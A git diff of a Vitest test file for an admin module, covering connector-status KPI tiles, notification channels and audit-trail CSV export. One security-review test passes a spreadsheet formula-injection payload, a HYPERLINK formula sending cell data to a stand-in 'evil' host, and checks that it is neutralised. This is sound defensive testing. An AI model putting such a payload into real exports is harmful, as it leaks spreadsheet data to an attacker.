@@ -6,7 +6,8 @@
 // calendar option, connectors in error) are asserted explicitly.
 import { describe, expect, it } from 'vitest';
 import { money } from '@/lib/format';
-import { connectorStatus, costType, type ActivityKind, type ConnectorStatus } from '@/server/db/codes';
+import { connectorStatus, costType, type ActivityKind } from '@/server/db/codes';
+import { connectorLink, connectorState, type ConnectorLink, type ConnectorState } from './connectors';
 import PROTO from '@/server/prototype/prototype-data.json';
 import GEN from '@/server/prototype/prototype-generated.json';
 import GOLDEN from '@/features/admin/admin.golden.json';
@@ -14,7 +15,7 @@ import {
   ACTIVITY_ICON, BLANK_MACHINE_TYPE, MT_CALENDAR_OPTIONS, MT_COST_TYPES, MT_FORM_BASES, MT_FORM_CALENDARS, NEW_COST_CATEGORY, NEW_ITP_SYSTEM, NEW_PHASE,
   PLUMB_VIEWS, SETTINGS_CARDS, activityChips, activityKindLabel, auditCsv, auditCsvFileName, connectorNeedsAttention, connectorTone, costCategoriesTotal,
   countText, healthRuleText, holidayEntry, isSettingsCardKey, locationTypeShortLabel, machineTypeKpis, machineTypeListSub, machineTypeUseText,
-  normaliseMachineTypeCode, parseActivitySource, parseBudgetInput, parsePercentInput, parsePlumbView, parseThresholdInput, paymentTerms, plumbingKpis,
+  normaliseMachineTypeCode, parseActivitySource, parseBudgetInput, parsePercentInput, parsePlumbView, parseThresholdInput, paymentTerms, plumbingKpis, notificationChannels,
   settingsEntry, settingsKpis, thresholdText, thresholdsError, type MachineTypeFacts,
 } from './admin';
 
@@ -42,8 +43,10 @@ describe('Settings rules (settingsKpis / settingsCards / locTypeSeg / setHealth)
   });
 
   it('card metadata, location-type options and the add-entry draft', () => {
+    // R-031 (NEW-CURSUS-4 / NEW-CURSUS-7): the holidays card names Cursus, not Lucca, as the source for leave.
+    const cursus = (sub: string) => sub.replace('Lucca stays the source for leave', 'Cursus is the source for leave');
     expect(SETTINGS_CARDS.map((c) => ({ key: c.key, title: c.title, sub: c.sub, icon: `ph ph-${c.icon}` }))).toEqual(
-      G.en.settings.cards.map((c: any) => ({ key: c.key, title: c.title, sub: c.sub, icon: c.icon })),
+      G.en.settings.cards.map((c: any) => ({ key: c.key, title: c.title, sub: cursus(c.sub), icon: c.icon })),
     );
     expect(S.locTypes.map(locationTypeShortLabel)).toEqual(G.en.settings.locTypeSeg.map((o: any) => o.label));
     expect(isSettingsCardKey('holidays')).toBe(true);
@@ -166,17 +169,44 @@ describe('Machine-type rules (MT_ALL / mtKpis / mtList / mtVals / AF.mtype)', ()
 
 describe('Activity & integrations rules (plumbKpis / actChips / actRows / connRows)', () => {
   const kinds = (P.ACTIVITY as string[][]).map((a) => a[3] as ActivityKind);
-  const statuses = (P.CONNECTORS as string[][]).map((c) => connectorStatus.code(c[3]));
+  // The prototype's nine connectors as Keystone is really linked to them (R-021): Cursus without its API URL and Codex are
+  // mocks, MS Project exchanges files, the others do not exist.
+  const protoRows = (P.CONNECTORS as string[][]).map(([name, , , st]) => {
+    const link = connectorLink({ name, kind: name === 'Cursus' ? 'cursus' : 'static', mode: name === 'Cursus' ? 'mock' : null });
+    return { name, link, state: connectorState(link, connectorStatus.code(st), true) };
+  });
+  const row = (name: string, link: ConnectorLink, state: ConnectorState) => ({ name, link, state });
 
   it('KPI tiles per persona', () => {
     for (const [role, unread, title] of [['director', 3, 'Portfolio director'], ['pm', 4, 'Project manager']] as const) {
-      expect(plumbingKpis({ eventsToday: 6, connectorStatuses: statuses, unread, personaTitle: title, auditEntries: P.AUDIT.length })).toEqual(kpis(G.en.plumbing.kpisByRole[role]));
+      const expected = kpis(G.en.plumbing.kpisByRole[role]);
+      // R-021 (A-15): the prototype counted the seeded statuses — "9 · 7 healthy · 1 warning" and "3 channels · In-app ·
+      // e-mail · Teams"; the tiles now count what is really connected (no e-mail or Teams connector exists).
+      expect([expected[1].sub, expected[4].value, expected[4].sub]).toEqual(['7 healthy · 1 warning', '3', 'In-app · e-mail · Teams']);
+      expected[1] = { ...expected[1], sub: '1 connected · 2 mock · 6 not connected', color: OK };
+      // X-6b / S-11 (R-037): Teams is no notification channel any more (was "In-app · e-mail and Teams not connected").
+      expected[4] = { ...expected[4], value: '1', sub: 'In-app · e-mail not connected' };
+      expect(plumbingKpis({ eventsToday: 6, connectors: protoRows, unread, personaTitle: title, auditEntries: P.AUDIT.length })).toEqual(expected);
     }
-    // Deliberate: Vigie is the 10th connector; a connector in error counts with the warnings.
-    const k = plumbingKpis({ eventsToday: 0, connectorStatuses: [...statuses, 'ok', 'error'] as ConnectorStatus[], unread: 0, personaTitle: 'x', auditEntries: 0 });
-    expect(k[1]).toEqual({ label: 'Connectors', value: '11', sub: '8 healthy · 2 warning', color: LO });
+    // A live connector in warning or error needs attention; a mock or a missing one never does.
+    const k = plumbingKpis({
+      eventsToday: 0, connectors: [...protoRows, row('Vigie', 'live', 'warning'), row('X', 'live', 'error'), row('Y', 'live', 'ok')], unread: 0, personaTitle: 'x', auditEntries: 0,
+    });
+    expect(k[1]).toEqual({ label: 'Connectors', value: '12', sub: '4 connected · 2 mock · 6 not connected · 2 warning', color: LO });
     expect(k[2].color).toBe(OK);
-    expect(plumbingKpis({ eventsToday: 0, connectorStatuses: ['ok', 'ready'], unread: 0, personaTitle: 'x', auditEntries: 0 })[1]).toMatchObject({ sub: '1 healthy · 0 warning', color: OK });
+    // A connector disabled by IT counts as not connected.
+    expect(plumbingKpis({ eventsToday: 0, connectors: [row('A', 'live', 'disabled'), row('B', 'mock', 'disabled')], unread: 0, personaTitle: 'x', auditEntries: 0 })[1])
+      .toMatchObject({ sub: '0 connected · 0 mock · 2 not connected', color: OK });
+  });
+
+  // X-6b / S-11 (R-037): Teams is no notification channel any more, live or not (no channel posts) — the prototype counted it.
+  it('channels: in-app always, e-mail once its connector is live; Teams never', () => {
+    const ch = (email: ConnectorLink, teams: ConnectorLink) =>
+      plumbingKpis({ eventsToday: 0, connectors: [row('E-mail (SMTP)', email, email === 'live' ? 'ok' : 'not_connected'), row('Microsoft Teams', teams, teams === 'live' ? 'ok' : 'not_connected')], unread: 0, personaTitle: 'x', auditEntries: 0 })[4];
+    expect(ch('none', 'none')).toMatchObject({ value: '1', sub: 'In-app · e-mail not connected' });
+    expect(ch('live', 'none')).toMatchObject({ value: '2', sub: 'In-app · e-mail' });
+    expect(ch('none', 'live')).toMatchObject({ value: '1', sub: 'In-app · e-mail not connected' });
+    expect(ch('live', 'live')).toMatchObject({ value: '2', sub: 'In-app · e-mail' });
   });
 
   it('display options, source chips, row icons and filters', () => {
@@ -199,17 +229,38 @@ describe('Activity & integrations rules (plumbKpis / actChips / actRows / connRo
   });
 
   it('audit trail CSV (ISO 9001): header, newest first as given, RFC 4180 quoting, ISO timestamps', () => {
+    // R-168: the user account (e-mail), the reason and the values before / after (JSON) follow the prototype's six columns.
     const csv = auditCsv([
-      { occurredAt: '2026-09-25T07:12:00.000Z', who: 'Romain Aubert', object: 'CR-008', change: 'status: Draft → In review', area: 'Change control', projectCode: 'HLT-026' },
-      { occurredAt: '2026-09-24T15:30:00.000Z', who: 'Léa Marchand', object: 'Rate card', change: 'base: 82 → 85 €/h, "senior"', area: 'Settings', projectCode: null },
+      { occurredAt: '2026-09-25T07:12:00.000Z', who: 'Romain Aubert', object: 'CR-008', change: 'status: Draft → In review', area: 'Change control', projectCode: 'HLT-026', userEmail: 'romain.aubert@epc2i.fr' },
+      {
+        occurredAt: '2026-09-24T15:30:00.000Z', who: 'Léa Marchand', object: 'Rate card', change: 'base: 82 → 85 €/h, "senior"', area: 'Settings', projectCode: null,
+        userEmail: null, reason: 'Annual review', before: { rate: 82 }, after: { rate: 85 },
+      },
     ]);
     expect(csv.split('\r\n')).toEqual([
-      'When (UTC),Who,Object,Change,Area,Project',
-      '2026-09-25T07:12:00.000Z,Romain Aubert,CR-008,status: Draft → In review,Change control,HLT-026',
-      '2026-09-24T15:30:00.000Z,Léa Marchand,Rate card,"base: 82 → 85 €/h, ""senior""",Settings,',
+      'When (UTC),Who,Object,Change,Area,Project,User,Reason,Before,After',
+      '2026-09-25T07:12:00.000Z,Romain Aubert,CR-008,status: Draft → In review,Change control,HLT-026,romain.aubert@epc2i.fr,,,',
+      '2026-09-24T15:30:00.000Z,Léa Marchand,Rate card,"base: 82 → 85 €/h, ""senior""",Settings,,,Annual review,"{""rate"":82}","{""rate"":85}"',
       '',
     ]);
-    expect(auditCsv([], ['Quand (UTC)', 'Qui', 'Objet', 'Modification', 'Domaine', 'Projet'])).toBe('Quand (UTC),Qui,Objet,Modification,Domaine,Projet\r\n');
+    expect(auditCsv([], ['Quand (UTC)', 'Qui', 'Objet', 'Modification', 'Domaine', 'Projet', 'Utilisateur', 'Motif', 'Avant', 'Après']))
+      .toBe('Quand (UTC),Qui,Objet,Modification,Domaine,Projet,Utilisateur,Motif,Avant,Après\r\n');
+    expect(() => auditCsv([], ['Quand (UTC)', 'Qui', 'Objet', 'Modification', 'Domaine', 'Projet'])).toThrow();
     expect(auditCsvFileName('2026-10-09')).toBe('keystone-audit-trail-2026-10-09.csv');
+    // Security review: a value a spreadsheet would run as a formula is neutralised with a leading quote (the new cells too).
+    const evil = auditCsv([{ occurredAt: '2026-09-25T07:12:00.000Z', who: '@x', object: '=HYPERLINK("https://evil/?d="&A2,"x")', change: '+1', area: '-2', projectCode: null, reason: '=1+1' }]);
+    expect(evil.split('\r\n')[1]).toBe(`2026-09-25T07:12:00.000Z,'@x,"'=HYPERLINK(""https://evil/?d=""&A2,""x"")",'+1,'-2,,,'=1+1,,`);
+  });
+});
+
+describe('R-169 / R-021 — notification channels from the connectors', () => {
+  // X-6b / S-11 (R-037): Teams is no notification channel any more (no channel posts) — was "In-app · e-mail and Teams not
+  // connected" / "In-app · e-mail · Teams not connected".
+  it('in-app always; e-mail when its connector is live and enabled (D-7a); Teams never', () => {
+    expect(notificationChannels([])).toEqual({ count: 1, sub: 'In-app · e-mail not connected' });
+    expect(notificationChannels([{ name: 'E-mail (SMTP)', link: 'live', state: 'ok' }, { name: 'Microsoft Teams', link: 'live', state: 'ok' }, { name: 'Codex', link: 'mock', state: 'mock' }]))
+      .toEqual({ count: 2, sub: 'In-app · e-mail' });
+    expect(notificationChannels([{ name: 'E-mail (SMTP)', link: 'live', state: 'disabled' }, { name: 'Microsoft Teams', link: 'live', state: 'ok' }]))
+      .toEqual({ count: 1, sub: 'In-app · e-mail not connected' });
   });
 });
